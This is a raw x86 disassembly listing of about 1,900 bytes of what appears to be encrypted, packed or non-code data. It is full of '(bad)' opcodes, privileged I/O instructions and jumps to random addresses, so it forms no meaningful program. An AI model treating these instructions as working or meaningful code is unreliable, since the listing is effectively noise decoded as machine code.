  4207a4:	aad    0xa0
  4207a6:	pop    ss
  4207a7:	clc    
  4207a8:	cmc    
  4207a9:	adc    dh,ch
  4207ab:	frstor [ecx]
  4207ad:	retf   
  4207ae:	xchg   edi,eax
  4207af:	cdq    
  4207b0:	or     ecx,eax
  4207b2:	fisubr WORD PTR [ebp-0x2d]
  4207b5:	pushf  
  4207b6:	inc    esp
  4207b7:	fwait
  4207b8:	xor    BYTE PTR [eax],0x1d
  4207bb:	or     cl,BYTE PTR [edx]
  4207bd:	lds    esi,FWORD PTR [edi]
  4207bf:	and    DWORD PTR [ebp-0x75c661c6],0xffffffa1
  4207c6:	inc    ebx
  4207c7:	outs   dx,DWORD PTR ds:[esi]
  4207c8:	and    eax,0x4f218d09
  4207cd:	fisubr DWORD PTR [ecx+0x77]
  4207d0:	(bad)  
  4207d1:	(bad)  
  4207d2:	js     0x4207df
  4207d4:	pop    edi
  4207d5:	jae    0x42080b
  4207d7:	(bad)  
  4207da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207db:	adc    eax,0xc0eb3af9
  4207e0:	ss inc edx
  4207e2:	push   edx
  4207e3:	cmp    al,0xa4
  4207e5:	pop    ds
  4207e6:	aam    0x5e
  4207e8:	push   ebx
  4207e9:	mov    bl,0xb1
  4207eb:	ror    DWORD PTR [edx+0x61353d3b],1
  4207f1:	xchg   BYTE PTR [ebp+0x1],cl
  4207f4:	test   al,0x61
  4207f6:	pop    ds
  4207f7:	sub    al,0x63
  4207f9:	(bad)  
  4207fa:	js     0x420781
  4207fc:	or     BYTE PTR [eax+ecx*2],0x12
  420800:	sbb    dl,bl
  420802:	test   ebx,esp
  420804:	push   0xedea32d5
  420809:	xchg   ecx,eax
  42080a:	mov    WORD PTR [edi-0x3d],fs
  42080d:	push   DWORD PTR [ecx+ebx*8]
  420810:	inc    bx
  420812:	adc    DWORD PTR [eax+0x2ba7ce37],esi
  420818:	popa   
  420819:	pusha  
  42081a:	int3   
  42081b:	push   ecx
  42081c:	iret   
  42081d:	js     0x4207ba
  42081f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420820:	mov    ah,0x2b
  420822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420823:	jno    0x420893
  420825:	ins    DWORD PTR es:[edi],dx
  420826:	in     al,0x1a
  420828:	hlt    
  420829:	mov    esp,0xc826236e
  42082e:	xchg   edx,eax
  42082f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420830:	cmp    dh,BYTE PTR [ebp-0x7b8e6313]
  420836:	jnp    0x42086b
  420838:	rcr    BYTE PTR [esi],cl
  42083a:	add    BYTE PTR [eax+0x30],ch
  42083d:	repnz rcr DWORD PTR [ecx],1
  420840:	sub    al,0xa3
  420842:	add    eax,0xea780e40
  420847:	test   BYTE PTR [eax+0x8131b8a],bh
  42084d:	jno    0x4207da
  42084f:	mov    dl,0x40
  420851:	pop    ecx
  420852:	and    dl,BYTE PTR [ecx-0x5b8582d2]
  420858:	jno    0x420834
  42085a:	dec    ebx
  42085b:	in     eax,0xeb
  42085d:	cmp    eax,0xd3c351d9
  420862:	jnp    0x4207fa
  420864:	retf   0xc811
  420867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420868:	shl    BYTE PTR [edx+0x2e],cl
  42086b:	(bad)  
  42086c:	retf   
  42086d:	push   0x90cd4f19
  420872:	pop    edi
  420873:	mov    es,esi
  420875:	xchg   ebp,eax
  420876:	push   ds
  420877:	sub    eax,0x149df61f
  42087c:	push   DWORD PTR [ebp+0x9]
  42087f:	cld    
  420880:	inc    eax
  420881:	jb     0x42084b
  420883:	fwait
  420884:	ja     0x4208ac
  420886:	loop   0x420853
  420888:	and    BYTE PTR [edx+ebp*2-0x5b2a0427],0x96
  420890:	sbb    BYTE PTR [eax-0x43],ah
  420893:	cwde   
  420894:	cmc    
  420895:	in     eax,dx
  420896:	daa    
  420897:	cmp    BYTE PTR [edi],0x65
  42089a:	or     al,0xd0
  42089c:	or     ecx,DWORD PTR [eax]
  42089e:	shl    DWORD PTR [eax+0x61b955e2],0x57
  4208a5:	and    al,0xb1
  4208a7:	dec    edx
  4208a8:	or     cl,ah
  4208aa:	addr16 push ss
  4208ac:	(bad)  
  4208ad:	enter  0x3a09,0x7a
  4208b1:	sbb    ch,al
  4208b3:	icebp  
  4208b4:	test   DWORD PTR [ecx+0x47],ecx
  4208b7:	cs cli 
  4208b9:	stc    
  4208ba:	cmp    al,0x14
  4208bc:	test   al,0xb2
  4208be:	scas   al,BYTE PTR es:[edi]
  4208bf:	push   ds
  4208c0:	dec    esp
  4208c1:	in     al,dx
  4208c2:	icebp  
  4208c3:	add    edx,DWORD PTR [eax-0x4e]
  4208c6:	and    DWORD PTR [esi],edi
  4208c8:	stos   BYTE PTR es:[edi],al
  4208c9:	popa   
  4208ca:	adc    BYTE PTR [eax+0x19f5ed7c],dh
  4208d0:	lods   al,BYTE PTR ds:[esi]
  4208d1:	add    eax,0x90fea88c
  4208d6:	and    eax,DWORD PTR [ebp-0x4a]
  4208d9:	add    esp,DWORD PTR [eax-0x68009022]
  4208df:	sbb    cl,BYTE PTR [ebx-0x8748bef]
  4208e5:	mov    ebp,0x6f913f6a
  4208ea:	out    dx,al
  4208eb:	inc    ecx
  4208ec:	pop    esi
  4208ed:	sub    ax,0x8463
  4208f1:	add    al,0xe9
  4208f4:	cmp    eax,0x4f7c9b09
  4208f9:	mov    bl,0x2e
  4208fb:	aam    0x9e
  4208fd:	cmp    al,bh
  4208ff:	outs   dx,DWORD PTR ds:[esi]
  420900:	cli    
  420901:	and    DWORD PTR [ecx],eax
  420903:	fldcw  WORD PTR [ecx]
  420905:	arpl   WORD PTR [ebp-0x327ef13b],di
  42090b:	add    ch,dh
  42090d:	push   edx
  42090e:	jno    0x42097d
  420910:	mov    eax,ds:0xc8096aad
  420915:	fbld   TBYTE PTR [esi-0x14eb360a]
  42091b:	xchg   ebx,eax
  42091c:	test   bl,0x8
  42091f:	inc    eax
  420920:	aad    0x3e
  420922:	sti    
  420923:	shl    DWORD PTR [edi-0x67],cl
  420926:	cmp    al,0x1
  420928:	mov    bl,0x53
  42092a:	xor    dl,BYTE PTR [esi+0x62feb311]
  420930:	jle    0x420961
  420932:	mov    bl,0x3a
  420934:	dec    ecx
  420935:	arpl   si,bp
  420937:	mov    dl,0xb8
  420939:	add    BYTE PTR [eax],al
  42093b:	add    BYTE PTR [ecx],dl
  42093d:	push   cs
  42093e:	or     dl,ch
  420940:	pop    ds
  420941:	out    dx,al
  420942:	repz jmp FWORD PTR [edi+0x44cf0426]
  420949:	ins    BYTE PTR es:[edi],dx
  42094a:	add    esp,esi
  42094c:	test   DWORD PTR ds:[ecx],eax
  42094f:	add    BYTE PTR [ebp+0x71000002],al
  420955:	push   0x36
  420957:	and    dh,BYTE PTR [ebp+0x5df21dd9]
  42095d:	pop    eax
  42095e:	dec    edi
  42095f:	adc    esp,DWORD PTR [edx]
  420961:	lods   eax,DWORD PTR ds:[esi]
  420962:	loop   0x4209bf
  420964:	xchg   ebp,eax
  420965:	pop    ss
  420966:	aaa    
  420967:	mov    edi,0xf1a72df7
  42096c:	lock imul edx,DWORD PTR [esi-0x3a54f8c9],0x20
  420974:	push   esi
  420975:	out    dx,eax
  420976:	test   BYTE PTR [ecx+0x1e],dl
  420979:	mov    bh,0xf9
  42097b:	inc    edi
  42097c:	sbb    dl,BYTE PTR [ecx+0x57]
  42097f:	or     ecx,ebx
  420981:	int    0x4
  420983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420984:	cmp    DWORD PTR [ebx+eax*2+0x1ae0f3c6],0x93004719
  42098f:	push   eax
  420990:	mov    bh,BYTE PTR [edi]
  420992:	sbb    eax,0xf92a9098
  420997:	pop    ebx
  420998:	lock shl BYTE PTR [esi],1
  42099b:	(bad)
  42099e:	enter  0x1665,0x92
  4209a2:	adc    ecx,esp
  4209a4:	mov    al,BYTE PTR [ebx-0x14a476d9]
  4209aa:	or     DWORD PTR [edi-0x1d],0x3a9951b4
  4209b1:	jb     0x420993
  4209b3:	adc    BYTE PTR [esi+0x74727a8d],0xa
  4209ba:	neg    BYTE PTR [ebp-0xa]
  4209bd:	fmul   QWORD PTR [esi-0x699a1f31]
  4209c3:	push   cs
  4209c4:	pop    ebp
  4209c5:	adc    al,BYTE PTR [esi]
  4209c7:	popf   
  4209c8:	inc    edi
  4209c9:	std    
  4209ca:	clc    
  4209cb:	mov    BYTE PTR [edx],cl
  4209cd:	cmp    eax,0xa5794d1f
  4209d2:	fldenv [eax+0x406e180e]
  4209d8:	dec    esi
  4209d9:	aas    
  4209da:	adc    al,0x30
  4209dc:	sbb    edi,DWORD PTR [ebp+ebx*1-0x44]
  4209e0:	lds    edx,FWORD PTR [ebp-0x444b71f9]
  4209e6:	loop   0x420a53
  4209e8:	test   DWORD PTR [ebx],0x98684896
  4209ee:	scas   al,BYTE PTR es:[edi]
  4209ef:	push   cs
  4209f0:	mov    eax,0xb7da8cb1
  4209f5:	pop    DWORD PTR [edx+esi*2-0x784020bf]
  4209fc:	pop    es
  4209fd:	push   0xffffffca
  4209ff:	loope  0x420a07
  420a01:	test   eax,0xb2f71cf3
  420a06:	dec    ecx
  420a07:	push   DWORD PTR [esi+0x20]
  420a0a:	arpl   WORD PTR [ebx+0x7c25e2f4],ax
  420a10:	mov    ds:0x8adb82d0,al
  420a15:	jmp    DWORD PTR [eax]
  420a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a18:	fwait
  420a19:	xor    ch,BYTE PTR [eax-0x4]
  420a1c:	or     bh,BYTE PTR [ebp+esi*4+0x53]
  420a20:	call   0x500415d0
  420a25:	loop   0x4209ac
  420a27:	sub    DWORD PTR [edx+eiz*2+0x1b],edi
  420a2b:	push   esi
  420a2c:	outs   dx,BYTE PTR ds:[esi]
  420a2d:	fimul  WORD PTR [ecx+0xf]
  420a30:	gs sbb ah,bh
  420a33:	iret   
  420a34:	ins    DWORD PTR es:[edi],dx
  420a35:	jo     0x420a31
  420a37:	in     al,dx
  420a38:	das    
  420a39:	lods   eax,DWORD PTR ds:[esi]
  420a3a:	shr    DWORD PTR [ecx+0x7],1
  420a3d:	fist   DWORD PTR [esi+0xef2cac]
  420a43:	mov    dl,0xa4
  420a45:	imul   esp,esp,0x6f
  420a48:	mov    ebp,ss
  420a4a:	push   es
  420a4b:	push   edx
  420a4c:	out    dx,al
  420a4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a4e:	cmp    cl,dl
  420a50:	das    
  420a51:	aam    0xe2
  420a53:	sbb    ecx,ebp
  420a55:	xor    BYTE PTR [ebp+0x36bdcd27],bh
  420a5b:	int3   
  420a5c:	arpl   cx,sp
  420a5e:	jae    0x420a21
  420a60:	adc    ah,BYTE PTR [edi-0x77]
  420a63:	adc    al,0xc9
  420a65:	push   edx
  420a66:	fild   QWORD PTR [esp+ebp*4+0x5f]
  420a6a:	imul   edx,DWORD PTR [ebp+0x4e],0x3b
  420a6e:	xor    ch,BYTE PTR [esi-0x75]
  420a71:	dec    ebp
  420a72:	push   edx
  420a73:	ror    BYTE PTR [esi+0x49],0x98
  420a77:	inc    esp
  420a78:	lods   al,BYTE PTR ds:[esi]
  420a79:	into   
  420a7a:	sbb    al,0x15
  420a7c:	xchg   ecx,eax
  420a7d:	clc    
  420a7e:	xchg   ecx,eax
  420a7f:	mov    al,0x12
  420a81:	adc    BYTE PTR [edi],al
  420a83:	out    0x38,eax
  420a85:	loop   0x420ab8
  420a87:	jge    0x420b08
  420a89:	dec    edx
  420a8a:	(bad)  
  420a8b:	sar    BYTE PTR [ecx],0x27
  420a8e:	arpl   ax,ax
  420a90:	sub    al,0x7f
  420a92:	adc    cl,BYTE PTR [ebx+0x4cfa69bc]
  420a98:	inc    esi
  420a99:	adc    DWORD PTR [esi-0x3160a474],edi
  420a9f:	imul   edi,DWORD PTR [ebx+0x646b44d0],0x68f39e27
  420aa9:	jle    0x420aa2
  420aab:	add    bl,BYTE PTR [esi+ebp*2-0x5c]
  420aaf:	sbb    esi,DWORD PTR ds:0xfca3310e
  420ab5:	dec    ebx
  420ab6:	into   
  420ab7:	idiv   DWORD PTR [ecx]
  420ab9:	repnz aaa 
  420abb:	or     cl,ah
  420abd:	mov    edi,0xffc276cc
  420ac2:	pop    ebx
  420ac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ac4:	lods   al,BYTE PTR ds:[esi]
  420ac5:	int    0x15
  420ac7:	div    dl
  420ac9:	add    ebx,edi
  420acb:	sub    DWORD PTR [ebp-0x57],ebx
  420ace:	adc    eax,0x3a485aa4
  420ad3:	mov    esp,DWORD PTR [edi+esi*2]
  420ad6:	and    eax,0x229db10a
  420adb:	and    ecx,DWORD PTR [ebx]
  420add:	cmp    ah,bh
  420adf:	push   esi
  420ae0:	pop    DWORD PTR [esi+0x40def168]
  420ae6:	out    0xe1,al
  420ae8:	push   ebx
  420ae9:	sysret 
  420aeb:	add    BYTE PTR [ebx+0x4],ah
  420aee:	cwde   
  420aef:	fld    TBYTE PTR [esi-0xbea8c18]
  420af5:	ficomp DWORD PTR [eax-0x163eba39]
  420afb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420afc:	jmp    0x6f65bc9c
  420b01:	and    al,0x73
  420b03:	in     al,dx
  420b04:	inc    edx
  420b05:	je     0x420abc
  420b07:	push   0x66cf9d20
  420b0c:	dec    edi
  420b0d:	or     ecx,ecx
  420b0f:	jl     0x420b15
  420b11:	mov    es,ebp
  420b13:	xor    BYTE PTR [ecx+0xaaef43d],cl
  420b19:	xchg   esi,eax
  420b1a:	mov    bl,0xdc
  420b1c:	sub    al,bh
  420b1e:	gs push 0x24cbff5b
  420b24:	pop    ecx
  420b25:	add    eax,0x568dfaa3
  420b2a:	add    bl,BYTE PTR [esi+0x7de14928]
  420b30:	aaa    
  420b31:	bound  edx,QWORD PTR [eax-0x16]
  420b34:	sub    al,0xb5
  420b36:	jp     0x420b76
  420b38:	int    0x1b
  420b3a:	cmc    
  420b3b:	xor    edi,DWORD PTR [edx+0x3a]
  420b3e:	das    
  420b3f:	mov    edx,0xddc3f8a
  420b44:	add    DWORD PTR [edi],eax
  420b46:	hlt    
  420b47:	jmp    0xebae:0xf349fac6
  420b4e:	jg     0x420b62
  420b50:	xlat   BYTE PTR ds:[ebx]
  420b51:	ins    DWORD PTR es:[edi],dx
  420b52:	dec    ebp
  420b53:	loopne 0x420b7e
  420b55:	dec    eax
  420b56:	out    dx,al
  420b57:	enter  0x6b2c,0x2d
  420b5b:	sbb    dl,BYTE PTR [edi+0x2c81604c]
  420b61:	jns    0x420b70
  420b63:	adc    BYTE PTR [edi],al
  420b65:	loopne 0x420b0e
  420b67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b68:	mov    eax,ds:0x6d84064f
  420b6d:	fnstcw WORD PTR ds:0xd3410312
  420b73:	test   bh,al
  420b75:	sbb    DWORD PTR cs:0xeedaf04f,edx
  420b7c:	les    edi,FWORD PTR [eax]
  420b7e:	push   esp
  420b7f:	call   0x5d31:0x1a5867e7
  420b86:	or     BYTE PTR cs:[ebx-0x50],dl
  420b8a:	mov    ch,0x5d
  420b8c:	test   eax,0x7848bd83
  420b91:	out    0x8f,eax
  420b93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b95:	fwait
  420b96:	sub    ch,BYTE PTR [edi+0x3f304d5b]
  420b9c:	jne    0x420bde
  420b9e:	enter  0x57bb,0x13
  420ba2:	loop   0x420b48
  420ba4:	scas   eax,DWORD PTR es:[edi]
  420ba5:	pop    ss
  420ba6:	rcl    al,1
  420ba8:	jmp    0xdcc69e00
  420bad:	jmp    0x7eb38c1d
  420bb2:	and    eax,0x65b85f9
  420bb7:	in     al,dx
  420bb8:	or     BYTE PTR [eax+edi*4+0x3dd2ed1],bh
  420bbf:	test   BYTE PTR [ebx],0xf9
  420bc2:	mov    esp,0x7b93ff20
  420bc7:	out    0x6b,eax
  420bc9:	pop    esi
  420bca:	ror    BYTE PTR [ebp-0x321a9246],0xc8
  420bd1:	adc    al,0xbf
  420bd3:	mov    esp,0x1f23a943
  420bd8:	push   edi
  420bd9:	add    BYTE PTR [eax],al
  420bdb:	add    cl,cl
  420bdd:	xchg   esi,eax
  420bde:	ins    DWORD PTR es:[edi],dx
  420bdf:	mov    dh,0x7f
  420be1:	(bad)  
  420be2:	(bad)  
  420be4:	aam    0xd9
  420be6:	inc    ebx
  420be7:	fmul   DWORD PTR [edi-0x3c6af3b0]
  420bed:	xchg   DWORD PTR [ecx],eax
  420bef:	add    BYTE PTR [ebp-0x8fffffe],al
  420bf5:	xor    eax,0xa3fbdbc5
  420bfa:	fwait
  420bfb:	sbb    BYTE PTR [eax],bl
  420bfd:	sub    al,BYTE PTR [ebx+0x3a50e0fa]
  420c03:	cmp    al,BYTE PTR [esi+edx*2]
  420c06:	pop    esp
  420c07:	cmp    eax,0xcee23e67
  420c0c:	cmp    al,BYTE PTR [esp+eax*4-0x1]
  420c10:	inc    esi
  420c11:	popa   
  420c12:	inc    ebx
  420c13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c14:	(bad)  
  420c15:	faddp  st(6),st
  420c17:	jo     0x420c73
  420c19:	cmp    edi,DWORD PTR [eax]
  420c1b:	lea    esp,[edx+0x5e60d6e0]
  420c21:	sub    eax,0x90d957ff
  420c26:	or     eax,esp
  420c28:	cmp    eax,DWORD PTR [edi+eiz*8-0x69]
  420c2c:	jns    0x420bf0
  420c2e:	call   0x84b2c1bd
  420c33:	or     ah,BYTE PTR [eax]
  420c35:	test   al,0xab
  420c37:	xchg   edi,eax
  420c38:	sub    ebp,edx
  420c3a:	sub    DWORD PTR [esp+eax*4],eax
  420c3d:	sbb    dl,bl
  420c3f:	and    al,0x1e
  420c41:	jmp    0x420c2a
  420c43:	jbe    0x420bd3
  420c45:	(bad)  
  420c46:	loopne 0x420c4e
  420c48:	fcmovnu st,st(7)
  420c4a:	icebp  
  420c4b:	ror    DWORD PTR [ecx],cl
  420c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c4e:	imul   ebx,DWORD PTR es:[edx+esi*4-0x74ce598f],0x7382f5c4
  420c5a:	jge    0x420ca5
  420c5c:	fisub  DWORD PTR [eax+ebp*1+0x4aa16353]
  420c63:	in     eax,0xfd
  420c65:	fdiv   st,st(6)
  420c68:	and    BYTE PTR [esi+0x16af414a],0x99
  420c6f:	sub    ebx,DWORD PTR [esp+ebx*1]
  420c72:	mov    ds:0x4150a6ab,eax
  420c77:	mov    ch,0xce
  420c79:	scas   eax,DWORD PTR es:[edi]
  420c7a:	call   0x29ff:0x65db5f11
  420c81:	mov    ah,0xc6
  420c83:	call   DWORD PTR [edi]
  420c85:	test   al,0xfc
  420c87:	and    al,0x83
  420c89:	dec    eax
  420c8a:	push   ss
  420c8b:	mov    eax,ss
  420c8d:	(bad)  
  420c8e:	neg    BYTE PTR [eax]
  420c90:	jnp    0x420ca8
  420c92:	xchg   DWORD PTR [ebx+edx*1+0x78],edx
  420c96:	cdq    
  420c97:	push   esi
  420c98:	cwde   
  420c99:	add    DWORD PTR [edx],edx
  420c9b:	fisttp DWORD PTR [ebx+0x6a]
  420c9e:	pop    ecx
  420c9f:	add    DWORD PTR [esi+ecx*8],esp
  420ca2:	js     0x420d13
  420ca4:	into   
  420ca5:	test   BYTE PTR [ecx-0x79],ch
  420ca8:	sbb    dh,BYTE PTR [edx+ebp*2-0x715018d7]
  420caf:	std    
  420cb0:	and    dh,ah
  420cb2:	jno    0x420d1f
  420cb4:	aaa    
  420cb5:	sub    BYTE PTR [ecx+ecx*8],cl
  420cb8:	imul   edx,DWORD PTR [esi+0x22],0xc3f99fb5
  420cbf:	mov    ds:0x4f8541be,al
  420cc4:	cmp    DWORD PTR [esi-0x59],eax
  420cc7:	dec    edi
  420cc8:	fsubr  QWORD PTR [ecx+edi*4]
  420ccb:	repnz dec eax
  420ccd:	fist   DWORD PTR [ecx-0x2c]
  420cd0:	adc    DWORD PTR [eax-0x2232c0c6],edi
  420cd6:	inc    eax
  420cd7:	push   eax
  420cd8:	dec    esp
  420cd9:	repz adc esi,edx
  420cdc:	inc    ebx
  420cdd:	or     DWORD PTR [ecx+0x6e1fa9d8],ebp
  420ce3:	lods   al,BYTE PTR ds:[esi]
  420ce4:	pop    ds
  420ce5:	neg    DWORD PTR [edx]
  420ce7:	and    BYTE PTR [esi+ecx*4+0x604867db],bl
  420cee:	shl    BYTE PTR [edi+eax*8-0x1c2f3ec7],1
  420cf5:	aad    0xb
  420cf7:	jae    0x420c98
  420cf9:	inc    esi
  420cfa:	dec    ebx
  420cfb:	or     eax,0x31
  420cfe:	and    ebp,DWORD PTR [ecx]
  420d00:	aad    0x6
  420d02:	(bad)  
  420d03:	mov    bh,0xb
  420d05:	mov    dl,0x94
  420d07:	call   0x7c0a7507
  420d0c:	adc    DWORD PTR [edi+0x2c25451a],edi
  420d12:	in     eax,0x7a
  420d14:	out    0xde,eax
  420d16:	imul   ecx,DWORD PTR [edx],0xffffffb9
  420d19:	push   ecx
  420d1a:	or     DWORD PTR [esi],ebp
  420d1c:	nop
  420d1d:	mov    esi,0x4e097373
  420d22:	lock ss inc esp
  420d25:	push   ecx
  420d26:	lods   eax,DWORD PTR ds:[esi]
  420d27:	dec    ebp
  420d28:	ins    BYTE PTR es:[edi],dx
  420d29:	rcr    DWORD PTR ds:0xe268048,cl
  420d2f:	and    edi,edx
  420d31:	(bad)  
  420d32:	lock cdq 
  420d34:	scas   al,BYTE PTR es:[edi]
  420d35:	inc    ebp
  420d36:	jne    0x420d1d
  420d38:	dec    ebx
  420d39:	ret    
  420d3a:	mov    cl,0x13
  420d3c:	pop    ecx
  420d3d:	fadd   QWORD PTR [ebx-0x2a]
  420d40:	xlat   BYTE PTR ds:[ebx]
  420d41:	repz sub BYTE PTR [ebp+ebx*2-0x30909711],0x3
  420d4a:	mov    ds:0x1a171628,al
  420d4f:	imul   esi,eax,0x4e89a28d
  420d55:	jecxz  0x420d5c
  420d57:	fwait
  420d58:	aas    
  420d59:	pop    ebp
  420d5a:	cmovo  ecx,DWORD PTR [ebx-0xa2e2ed6]
  420d61:	and    DWORD PTR [edi],ecx
  420d63:	xchg   edx,eax
  420d64:	sbb    eax,0xbf7cf935
  420d69:	imul   esp,DWORD PTR [edx-0x2e],0x54
  420d6d:	rcr    al,cl
  420d6f:	aaa    
  420d70:	cmp    bl,BYTE PTR [edi-0x61c94e2e]
  420d76:	mov    ebx,0x292bbbd8
  420d7b:	(bad)
  420d7f:	and    dh,BYTE PTR [ebx-0xe]
  420d82:	sbb    eax,0xe15d2f3c
  420d87:	adc    ebp,DWORD PTR [esi-0x223fe72a]
  420d8d:	add    DWORD PTR [ecx+0x3ec850d7],edi
  420d93:	arpl   WORD PTR [ebx+0x37],di
  420d96:	mov    dh,0x7e
  420d98:	xchg   BYTE PTR [ebp+0x26d2509e],al
  420d9e:	jecxz  0x420d40
  420da0:	adc    ebp,DWORD PTR [edx+0x5128d044]
  420da6:	fxch   st(3)
  420da8:	mov    ds:0x552f3930,eax
  420dad:	push   cs
  420dae:	sub    DWORD PTR [esi],edi
  420db0:	sbb    al,0x54
  420db2:	stos   DWORD PTR es:[edi],eax
  420db3:	cmc    
  420db4:	jp     0x420daf
  420db6:	or     al,0x58
  420db8:	jecxz  0x420d4d
  420dba:	add    eax,0x1b0d4830
  420dbf:	les    esi,FWORD PTR [edi+0x7e]
  420dc2:	pop    ebx
  420dc3:	mov    ds:0x9a18927f,al
  420dc8:	inc    esi
  420dc9:	addr16 add eax,0xa79ef8e2
  420dcf:	and    ch,ah
  420dd1:	ds sub eax,0x45156e22
  420dd7:	dec    esp
  420dd8:	ss gs adc ch,bh
  420ddc:	sbb    DWORD PTR [ebx+0x6796c22f],esi
  420de2:	shr    BYTE PTR ds:[ecx+0x55],cl
  420de6:	int3   
  420de7:	test   eax,0x899686e1
  420dec:	iret   
  420ded:	pop    esi
  420dee:	inc    ecx
  420def:	(bad)  
  420df0:	mov    ebp,0xd90bb42d
  420df5:	stos   DWORD PTR es:[edi],eax
  420df6:	adc    ah,BYTE PTR [ebp-0x15d4fcc]
  420dfc:	jle    0x420e71
  420dfe:	or     DWORD PTR [ebx],0x18f74b1e
  420e04:	dec    eax
  420e05:	aad    0xfe
  420e07:	inc    ebp
  420e08:	jge    0x420e6f
  420e0a:	sbb    al,0xb3
  420e0c:	pop    es
  420e0d:	repnz dec eax
  420e0f:	rol    DWORD PTR [edi+0x766f2719],0x32
  420e16:	mov    DWORD PTR [edx-0x69487e],ecx
  420e1c:	or     al,0xa0
  420e1e:	in     eax,dx
  420e1f:	repz xor BYTE PTR [ecx],bh
  420e22:	add    edi,esi
  420e24:	test   al,0xde
  420e26:	stc    
  420e27:	or     eax,0xe1bfe9f6
  420e2c:	mov    ds,WORD PTR [esp+ebp*8+0x4e]
  420e30:	mov    ah,0x5c
  420e32:	repz fistp WORD PTR ds:0x2f3e0d94
  420e39:	rcr    DWORD PTR [ecx],0xd5
  420e3c:	pop    edi
  420e3d:	dec    esp
  420e3e:	outs   dx,BYTE PTR ds:[esi]
  420e3f:	clc    
  420e40:	pop    edx
  420e41:	pushf  
  420e42:	enter  0x9abd,0x1c
  420e46:	test   eax,0x17b449e9
  420e4b:	shr    BYTE PTR [ecx],cl
  420e4d:	mov    ah,0xc1
  420e4f:	sub    ebp,DWORD PTR [ebx]
  420e51:	stc    
  420e52:	mov    eax,DWORD PTR [ebx+0x4b]
  420e55:	bnd jb 0x420e52
  420e58:	cmp    eax,0xf9a15725
  420e5d:	sub    eax,0x5f0baee
  420e62:	sub    edx,esi
  420e64:	mov    esi,0xb124401f
  420e69:	std    
  420e6a:	and    BYTE PTR [eax],cl
  420e6c:	xchg   esp,eax
  420e6d:	inc    ecx
  420e6e:	test   ebp,esp
  420e70:	jmp    0x2bd8f38e
  420e75:	lods   al,BYTE PTR ds:[esi]
  420e76:	rol    BYTE PTR [ecx+0x28],0x0
  420e7a:	add    BYTE PTR [eax],al
  420e7c:	dec    eax
  420e7d:	out    dx,eax
  420e7e:	ja     0x420eeb
  420e80:	idiv   ebx
  420e82:	pop    esp
  420e83:	out    dx,eax
  420e84:	dec    esp
  420e85:	mul    BYTE PTR [esi-0x7d]
  420e88:	test   esi,eax
  420e8a:	inc    ecx
  420e8b:	cmovs  ecx,DWORD PTR [edx+0x2850001]
  420e92:	add    BYTE PTR [eax],al
  420e94:	inc    ebx
  420e95:	push   esi
  420e96:	mov    eax,0x1635a3a3
  420e9b:	and    eax,DWORD PTR [eax+0x7c550036]
  420ea1:	mov    dl,0xa8
  420ea3:	das    
  420ea4:	je     0x420e32
  420ea6:	cli    
  420ea7:	jg     0x420f04
  420ea9:	popf   
  420eaa:	xor    DWORD PTR [esi-0x2f0da74],edx
  420eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eb1:	or     BYTE PTR [ecx+0x16],ch
  420eb4:	xor    bh,BYTE PTR [ebp-0x48]
  420eb7:	mov    al,0x68
  420eb9:	addr16 shr ebp,0x62
  420ebd:	pop    ss
  420ebe:	push   edx
  420ebf:	jb     0x420e47
  420ec1:	ds ds xor al,0x57
  420ec5:	mov    bh,0xe8
  420ec7:	sub    eax,0xbd4490c5
  420ecc:	shl    bh,0xb0
  420ecf:	test   DWORD PTR [ecx],ecx
  420ed1:	add    esi,DWORD PTR [eax+0x25]
  420ed4:	in     eax,0xa6
  420ed6:	adc    BYTE PTR [edi+0x277e61ed],ah
  420edc:	cdq    
  420edd:	cmp    eax,0x723c9bda
  420ee2:	mov    ah,0x66
  420ee4:	xor    al,0x5
  420ee6:	pop    ebp
  420ee7:	mov    ecx,0x71cd5207
  420eec:	push   ebp
  420eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eee:	or     edi,esi
  420ef0:	test   edx,ecx
  420ef2:	cmp    ch,BYTE PTR [eax+0x7c1025d2]
  420ef8:	imul   esi,DWORD PTR [edx+ebx*4-0x3bcd95fd],0x8895a8e
  420f03:	sub    ah,bl
  420f05:	inc    edx
  420f06:	jmp    0x420f3a
  420f08:	inc    esp
  420f09:	pop    edx
  420f0b:	std    
  420f0c:	and    edi,DWORD PTR [eax-0x7a]
  420f0f:	inc    esp
  420f10:	adc    eax,0x3543f056
  420f15:	xor    eax,0x3769d5e8
  420f1a:	adc    DWORD PTR [edx-0x463f78b5],ebx
  420f20:	dec    ebp
  420f21:	imul   esi,DWORD PTR [ecx+0x4856b665],0x896beb
  420f2b:	cdq    
  420f2c:	stc    
  420f2d:	je     0x420f7c
  420f2f:	lock dec ebx
  420f31:	or     eax,0x1aef5c45
  420f36:	rol    BYTE PTR [eax+0x300fc18d],1
  420f3c:	mov    edi,0xbd8db898
  420f41:	push   es
  420f42:	jle    0x420f4d
  420f44:	jno    0x420f92
  420f46:	sbb    BYTE PTR [edi+0x7cd7c08d],0x38
  420f4d:	dec    edi
  420f4e:	inc    esi
  420f4f:	cvtps2pi mm5,QWORD PTR [ebx-0x67]
  420f53:	push   esp
  420f54:	mov    eax,0xe070090
  420f59:	mov    dl,0xa
  420f5b:	push   0xa7d445d7
  420f60:	dec    esi
  420f61:	repz pop edi
  420f63:	xchg   esp,eax
  420f64:	out    dx,eax
  420f65:	push   es
  420f66:	and    ah,BYTE PTR [ebp+0x26]
  420f69:	inc    esi
  420f6a:	cld    
  420f6b:	imul   ebx,DWORD PTR [edx+0x51ad6596],0x59a76966
